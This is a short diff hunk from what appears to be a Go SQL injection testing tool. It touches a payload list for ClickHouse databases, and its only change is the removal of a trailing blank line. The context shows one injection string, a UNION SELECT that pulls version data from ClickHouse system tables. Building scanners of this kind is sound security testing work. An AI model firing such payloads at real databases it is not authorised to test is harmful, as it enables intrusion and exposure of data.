@@ -110,4 +110,3 @@ var ClickHouse = PayloadGroup{
 		{Type: "deep", Content: "' UNION SELECT groupArray(version()) FROM system.build_options--"},
 	},
 }
-
